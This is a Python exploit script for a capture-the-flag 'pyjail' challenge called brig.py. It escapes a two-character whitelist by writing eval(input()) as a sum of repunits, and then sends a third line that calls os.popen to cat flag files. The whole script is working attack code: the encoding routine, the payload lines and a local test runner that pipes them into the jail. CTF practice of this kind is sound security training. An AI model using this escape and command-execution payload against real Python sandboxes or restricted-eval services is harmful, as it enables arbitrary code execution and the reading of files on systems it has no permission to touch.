#!/usr/bin/env python3
"""
Exploit for brig.py pyjail challenge.

Strategy:
  1. Choose characters '1' and '+' as our 2-symbol alphabet
  2. Construct a sum of repunits (1, 11, 111, ...) that equals
     bytes_to_long(b"eval(input())")
  3. The jail evaluates our expression -> gets a big integer
  4. long_to_bytes converts it back to b"eval(input())"
  5. The outer eval() runs eval(input()), reading a 3rd line from stdin
  6. On that 3rd line, we send unrestricted Python to read the flag
"""
from Crypto.Util.number import bytes_to_long, long_to_bytes

def repunit_decompose(N):
    """Decompose N into a sum of repunits (1, 11, 111, ...) greedily."""
    terms = []
    remaining = N
    max_k = len(str(remaining)) + 1
    for k in range(max_k, 0, -1):
        R_k = int('1' * k)
        while R_k <= remaining:
            remaining -= R_k
            terms.append(k)
    assert remaining == 0, f"Decomposition failed, remaining={remaining}"
    return terms

def build_expression(terms):
    """Build a '+'-separated expression of repunits."""
    return '+'.join('1' * k for k in terms)

# Build the payload
target_code = b"eval(input())"
N = bytes_to_long(target_code)
terms = repunit_decompose(N)
expr = build_expression(terms)

# Verify
assert eval(expr) == N
assert long_to_bytes(N) == target_code
assert len(expr) < 4096
assert set(expr) <= {'1', '+'}

# Line 1: the two allowed characters
line1 = "1+"
# Line 2: the repunit sum (uses only '1' and '+')
line2 = expr
# Line 3: arbitrary Python code executed by eval(input())
line3 = "__import__('os').popen('cat flag* 2>/dev/null || cat /flag* 2>/dev/null || echo NO_FLAG_FOUND').read().strip()"

print(f"[*] Payload: eval(input()) encoded as {len(expr)}-char repunit sum")
print(f"[*] Characters used: {set(expr)}")

# Output the exploit for piping into the jail
import sys
if '--raw' in sys.argv:
    # Raw mode: just print the 3 lines for piping
    print(line1)
    print(line2)
    print(line3)
else:
    # Test mode: run locally
    import subprocess, os

    # Create test flag if none exists
    flag_existed = os.path.exists('flag')
    if not flag_existed:
        with open('flag', 'w') as f:
            f.write("BCCTF{test_jail_escape}")

    payload = f"{line1}\n{line2}\n{line3}\n"
    result = subprocess.run(
        ['python3', 'brig.py'],
        input=payload, capture_output=True, text=True, cwd=os.path.dirname(__file__) or '.'
    )
    print(result.stdout)
    if result.stderr:
        print(f"STDERR: {result.stderr}")

    if not flag_existed:
        os.remove('flag')
